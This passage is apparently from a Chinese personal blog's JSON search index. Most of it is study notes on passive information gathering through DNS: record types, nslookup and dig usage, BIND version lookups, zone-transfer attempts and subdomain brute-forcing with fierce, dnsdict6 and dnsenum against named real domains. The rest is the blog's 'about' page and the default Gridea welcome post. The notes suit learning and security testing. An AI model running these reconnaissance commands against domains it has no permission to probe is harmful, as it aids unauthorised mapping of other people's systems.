直接访问有时候也不⾏，如果对⽅设置了禁⽌ip访问。 DNS 介绍 域名解析成ip地址 域名与FQDN的区别 域名： baidu.com FQDN：smtp.baidu.com www.baidu.com 域名记录：A 、C name （别名记录）、NS 、MX 、ptr（ip到域名 反向解析域名） DNS递归查询与迭代查询的详细流程 名词解释 抓包分析迭代查询和递归查询 nslookup 基操 指定类型查询 set type= 域名服务器的地址 set type=ns 任何记录 set type=any 指定dns服务器 server 8.8.8.8#53 谷歌DNS域名服务器 补充 ： spf记录 https://www.renfei.org/blog/introduction-to-spf.html nslookup -q=any sheep0818.xyz 8.8.8.8 DIG dig sheep0818.xyz ant @8.8.8.8 输出结果筛选 dig +noall +answer mail.163.com any | awk '{print $5}' 反向查询( ptr记录 ) dig -x 220.181.14.157 bind版本信息 dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com DNS追踪(先向本地dns服务器查根域地址，然后由本机进行迭代查询) dig +trace www.baidu.com DNS区域传输 dig @ns1.example.com example.com axfr host -T -l sina.com 8.8.8.8 DNS字典爆破 fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt dnsdict6 -d4 -t 16 -x sina.com dnsenum -f dnsbig.txt -dnserver 8.8.8.8 sina.com -o sina.xml DNS注册信息 whois whois -h whois.apnic.net 192.0.43.10 参考 https://github.com/Threekiii/Awesome-POC/tree/master ","link":"https://xmoct.github.io/post/bei-dong-xin-xi-shou-ji/"},{"title":"关于","content":"欢迎来到我的小站呀，很高兴遇见你！🤝 🏠 关于本站 一个记录学习的笔记地方 👨‍💻 博主是谁 一个喜欢摸鱼的人---Moyv ⛹ 兴趣爱好 躺着，真的是躺着。 📬 联系我呀 联系，就不了吧，顺手点个赞就行 ","link":"https://xmoct.github.io/post/about/"},{"title":"Hello Gridea ","content":"<!-- more --> 👏 欢迎使用 Gridea ！ ✍️ Gridea 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... <!-- more --> Github Gridea 主页 示例网站 常用颜色 特性👇 📝 你可以使用最酷的 Markdown 语法，进行快速创作 🌉 你可以给文章配上精美的封面图和在文章任意位置插入图片 🏷️ 你可以对文章进行标签分组 📋 你可以自定义菜单，甚至可以创建外部链接菜单 💻 你可以在 Windows，MacOS 或 Linux 设备上使用此客户端 🌎 你可以使用 𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌 或 Coding Pages 向世界展示，未来将支持更多平台 💬 你可以进行简单的配置，接入 Gitalk 或 DisqusJS 评论系统 🇬🇧 你可以使用中文简体或英语 🌁 你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力 🖥 你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步 🌱 当然 Gridea 还很年轻，有很多不足，但请相信，它会不停向前 🏃 未来，它一定会成为你离不开的伙伴 尽情发挥你的才华吧！ 😘 Enjoy~ ","link":"https://xmoct.github.io/post/hello-gridea/"}]}